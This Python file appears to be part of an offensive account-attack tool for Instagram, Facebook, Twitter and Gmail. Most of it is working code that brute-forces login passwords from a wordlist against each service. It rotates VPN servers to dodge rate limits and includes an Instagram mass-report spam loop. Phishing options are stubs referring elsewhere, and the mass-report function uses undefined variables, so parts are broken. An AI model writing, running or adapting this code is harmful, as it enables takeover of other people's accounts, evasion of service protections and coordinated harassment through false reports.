from rich.console import Console
import time
import os 
import random
import distro
import requests
from asciiart import ascii_art
from bs4 import BeautifulSoup
import instaloader
import smtplib

os.system("clear")

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CYAN_BG = '\33[1;37;40m'

console = Console()

#windscribe vpn random country
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W", "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
choiceCode = random.choice(codeList)


def change_ip():
  try:
    # Check if running on Arch Linux
    try:
      if "Arch" in distro.linux_distribution()[0]:
        os.system("sudo systemctl start windscribe")
    except:
      pass  # Ignore if distro detection fails

    # Connect to random VPN server
    print(f"\n{color.CYAN}[*] Connecting to VPN server: {choiceCode}...{color.END}")
    result = os.system("windscribe connect " + choiceCode + " > /dev/null 2>&1")

    if result == 0:
      print(f"{color.GREEN}[+] VPN connected successfully{color.END}")
      time.sleep(2)  # Wait for VPN to stabilize
    else:
      print(f"{color.YELLOW}[!] VPN connection may have failed, continuing...{color.END}")
      time.sleep(1)
  except Exception as e:
    print(f"{color.YELLOW}[!] VPN error: {str(e)}, continuing without VPN...{color.END}")
    time.sleep(1)

def start():


  console.print(ascii_art, justify="center", style="#B0DAFF bold")


  tasks = [f"task {n}" for n in range(1, 2000)]
  console.print("", justify="center", end="")

  with console.status("[purple bold]", spinner = 'arc') as status:
      while tasks:
          console.print("", justify="center", end="")
          task = tasks.pop(0)
          time.sleep(0.001)


def c1():
  console.print(":: 1 instagram | 2 facebook | 3 gmail | 4 twitter ::", justify="center", style="#B0DAFF")
  try:
    choice = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 0x01:"+color.RED+" please enter a number\n\n"+color.END)
    exit()
  if choice > 4 or choice < 1:
    print("\n\nEERROR 0x02:"+color.RED+" please enter a number between 1-4\n\n"+color.END)
    exit()

  return choice

def vpn_error():
  print("\n\nERROR 0x03: "+color.RED+"Unable to enable VPN on Windows\n\n"+color.END)
  exit()

def c_vpn():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: 0 vpn off | 1 vpn on ::", justify="center", style="#B0DAFF")
  try:
    choice = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 0x02:"+color.RED+" please enter a number between 0-1\n\n"+color.END)
    exit()
  if choice > 1 or choice < 0:
    print("\n\nERROR 0x02:"+color.RED+" please enter a number between 0-1\n\n"+color.END)
    exit()

  return choice


def start_instagram():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: 1 bruteforce | 2 mass report | 3 phishing ::", justify="center", style="#B0DAFF")
  try:
    choice = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 0x02:"+color.RED+" please enter a number\n\n"+color.END)
    exit()
  if choice > 3 or choice < 1:
    print("\n\nEERROR 0x01:"+color.RED+" please enter a number between 1-3\n\n"+color.END)
    exit()

  return choice
def get_facebook():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: username ::", justify="center", style="#B0DAFF")
  uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
def get_email():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: email ::", justify="center", style="#B0DAFF")
  uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
  return uname
def get_username():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: username ::", justify="center", style="#B0DAFF")
  uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉@")
  return uname

def get_wordlist():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: wordlist ::", justify="center", style="#B0DAFF")

  # List available wordlists
  wordlist_dir = "../wordlist"
  try:
    available_wordlists = [f for f in os.listdir(wordlist_dir) if f.endswith('.txt')]
    if available_wordlists:
      console.print("\n:: Available wordlists ::", justify="center", style="cyan")
      for idx, wl in enumerate(available_wordlists, 1):
        console.print(f"{idx}. {wl}", justify="center", style="green")
  except:
    pass

  wordlist = input("\n\n"+color.GREEN+" [wordlist filename]"+color.END+" 〉")
  return wordlist

def insta_bruteforce(username, wordlist, vpn):
  spam_bool = 1
  c_spam = 0

  try:
      wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
      wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
      count = 0
  except FileNotFoundError:
      print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist into the 'wordlist' folder.\n\n"+color.END)
      exit()

  rs = requests.session()
  total_passwords = len(wl_lines)
  print(f"\n{color.CYAN}[*] Loaded {total_passwords} passwords from {wordlist}{color.END}")
  print(f"{color.CYAN}[*] Starting bruteforce attack on @{username}...{color.END}\n")
  time.sleep(2)

  for idx, line in enumerate(wl_lines, 1):
      password = line

      try:
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(f"[{idx}/{total_passwords}] Testing: {password[:20]}{'...' if len(password) > 20 else ''}", justify="center", style="cyan")

        result = insta_pass(username, password)

        if result == True:
          os.system("clear")
          console.print(ascii_art, justify="center", style="#B0DAFF bold")
          console.print(f"\n{color.GREEN}[+] PASSWORD FOUND: {password}{color.END}\n", justify="center", style="bold green")
          console.print(f"Username: @{username}", justify="center", style="green")
          console.print(f"Password: {password}", justify="center", style="bold green")
          exit()
        else:
          os.system("clear")
          console.print(ascii_art, justify="center", style="#B0DAFF bold")
          console.print(f"[{idx}/{total_passwords}] Failed: {password[:30]}{'...' if len(password) > 30 else ''}", justify="center", style="bold red")

          # Add delay to avoid rate limiting
          delay = random.randint(2, 5)
          time.sleep(delay)

          c_spam = c_spam + 1

          # Change IP every 5-10 attempts if VPN is enabled
          if vpn == 1 and c_spam % random.randint(5, 10) == 0:
            change_ip()

      except KeyboardInterrupt:
        print(f"\n\n{color.YELLOW}[!] Attack interrupted by user{color.END}\n")
        exit()
      except Exception as e:
        print(f"\n{color.RED}[!] Error testing password: {str(e)}{color.END}")
        time.sleep(3)
        continue

  print(f"\n\n{color.RED}[!] Password not found in wordlist{color.END}\n")
        
def insta_pass(USER, PASSWORD):
  L = instaloader.Instaloader()
  try:
    L.login(USER, PASSWORD)
    # If login succeeds without exception, password is correct
    return True
  except Exception as e:
    error_msg = str(e).lower()

    # Debug: Print actual error (comment out in production)
    print(f"\n{color.CYAN}[DEBUG] Instagram Error: {str(e)[:200]}{color.END}")

    # Check for specific error patterns

    # Password is CORRECT but needs checkpoint/2FA
    if "checkpoint_required" in error_msg or "checkpoint challenge" in error_msg:
      return True
    if "two-factor" in error_msg or "two_factor" in error_msg:
      return True

    # Password is WRONG
    if "the password you entered is incorrect" in error_msg:
      return False
    if "incorrect password" in error_msg:
      return False
    if "wrong password" in error_msg:
      return False
    if "bad password" in error_msg:
      return False

    # User doesn't exist
    if "user does not exist" in error_msg or "couldn't find" in error_msg:
      print(f"\n{color.RED}[!] Error: User @{USER} does not exist!{color.END}\n")
      exit()

    # Rate limiting / Too many attempts
    if "wait a few minutes" in error_msg or "too many" in error_msg:
      print(f"\n{color.YELLOW}[!] Rate limited! Waiting 120 seconds...{color.END}")
      time.sleep(120)
      return False
    if "rate limit" in error_msg or "spam" in error_msg:
      print(f"\n{color.YELLOW}[!] Rate limited! Waiting 120 seconds...{color.END}")
      time.sleep(120)
      return False

    # Connection errors
    if "connection" in error_msg or "network" in error_msg:
      print(f"\n{color.YELLOW}[!] Connection error, retrying...{color.END}")
      time.sleep(5)
      return False

    # JSON/API errors (usually means wrong password)
    if "json" in error_msg or "api" in error_msg:
      return False

    # Default: treat unknown errors as wrong password
    # This prevents false positives
    print(f"\n{color.YELLOW}[!] Unknown error (treating as wrong password): {str(e)[:100]}{color.END}")
    return False
    


page_headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"DNT": "1",
}

report_headers = {
"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
"DNT": "1",
"Host": "help.instagram.com",
"Origin": "help.instagram.com",
"Pragma": "no-cache",
"Referer": "https://help.instagram.com/contact/497253480400030",
"TE": "Trailers",
}

nu = [1, 2, 3, 4]

spam_message = '''
'''

def get_amount():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: amount ::", justify="center", style="#B0DAFF")
  try:
    amount = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 2x00:"+color.RED+" please enter a number\n\n"+color.END)
    exit()
  return amount


def insta_massreport(username, vpn, amount, spam_bool):
     
     c_while = 0
     while c_while <= amount:
          if c_while < 0:
            c_while = 0
          if vpn == True:
               change_ip()
      


          try:
               lsd = res.text.split('["LSD",[],{"token":"')[1].split('"},')[0]
               spin_r = res.text.split('"__spin_r":')[1].split(',')[0]
               spin_b = res.text.split('"__spin_b":')[1].split(',')[0].replace('"',"")
               spin_t = res.text.split('"__spin_t":')[1].split(',')[0]
               hsi = res.text.split('"hsi":')[1].split(',')[0].replace('"',"")
               rev = res.text.split('"server_revision":')[1].split(',')[0].replace('"',"")
               datr = res.cookies.get_dict()["datr"]
          except:
               if random.choice(nu) == 2:
                os.system("clear")
                console.print(ascii_art, justify="center", style="#B0DAFF bold")
                console.print("[ "+str(c_while)+" ]", justify="center", style="#f70202 bold")
                c_while = c_while-2
               else:
                os.system("clear")
                console.print(ascii_art, justify="center", style="#B0DAFF bold")
                console.print("[ "+str(c_while)+" ]", justify="center", style="#23f702 bold")
                time.sleep(random.choice(nu))



          try:
               res = ses.post(
                    "https://help.instagram.com/ajax/help/contact/submit/page",
                    data=report_form,
                    headers=report_headers,
                    cookies=report_cookies,
                    timeout=10
               )
          except:
            if random.choice(nu) == 2:
              time.sleep(random.choice(nu))

            else:
              time.sleep(2)


          c_while = c_while+1

phishing_help = '''
Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/NullPulse/exaPhisher. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''
spam_phishing = '''

'''

facebook_ju  = '''
Facebook mass report Tool Under Development! We are currently working on implementing thath function. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''
twitter_ju  = '''
Twitter mass report Tool Under Development! We are currently working on implementing thath function. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''

gmail_ju  = '''
Gmail mass report Tool Under Development! We are currently working on implementing thath function. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''


facebook_ju_phishing  = '''
Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/NullPulse/exaPhisher. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''



def insta_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(phishing_help, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")

def facebook_massreport():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju, justify="center", style="#B0DAFF")

def twitter_massreport():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(twitter_ju, justify="center", style="#B0DAFF")


def facebook_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")

def twitter_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")


POST_URL = 'https://www.facebook.com/login.php'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

def is_this_a_facebook_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        console.print(password, justify="center", style="#13f41e bold")
    console.print(password, justify="center", style="#ea0408 bold")
    if random.choice(nu) == 2:
      time.sleep(5)
    else:
      time.sleep(2)


def facebook_bruteforce(username, wordlist, vpn):
  try:
    wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
    wl_lines = wl_file.readlines()
    count = 0
  except FileNotFoundError:
    print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
    exit() 
  for passw in wl_lines:
    os.system("clear")
    console.print(ascii_art, justify="center", style="#B0DAFF bold")
    is_this_a_facebook_password(username, 10, passw)
    if vpn == True:
      change_ip()

def twitter_bruteforce(username, wordlist, vpn):
  try:
      wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
      wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
      count = 0
  except FileNotFoundError:
      print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
      exit()  
  for password in wl_lines:  
     data = {"session[username_or_email]":username,
        "session[password]":password}
     r = requests.post("https://twitter.com/login/", data=data)

     if ("success" in r.text):
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        print(color.GREEN+"Password finded: "+color.END+password)
     else:
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(password, justify="center", style="#ea0408 bold")

     #CHANGE URL AND INPUT PASSWORD
     data = {"auth_password":password}
     r = requests.post("https://twitter.com/settings/your_twitter_data", data=data)

     if ("success" in r.text):
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(password, justify="center", style="#13f41e bold")
        sys.exit(0)
     if vpn == True:
      change_ip()




def gmail_bruteforce(username, wordlist, vpn):
  try:
    wl_file = open("wordlist/"+wordlist, 'r', encoding='latin-1', errors='ignore')
    wl_lines = wl_file.readlines()
    count = 0
  except FileNotFoundError:
    print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
    exit() 
  for password in wl_lines:
      try:
          session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
          session.starttls() #enable security
          session.login(username, password) #logi
          os.system("clear")
          console.print(ascii_art, justify="center", style="#B0DAFF bold")
          console.print(password, justify="center", style="#13f41e bold")
          exit()

      except Exception:
          os.system("clear")
          console.print(ascii_art, justify="center", style="#B0DAFF bold")
          console.print(password, justify="center", style="#ea0408 bold")
          if vpn == True:
              change_ip()
          time.sleep(random.choice(nu))

def gmail_massreport():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(gmail_ju, justify="center", style="#B0DAFF")


def gmail_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")
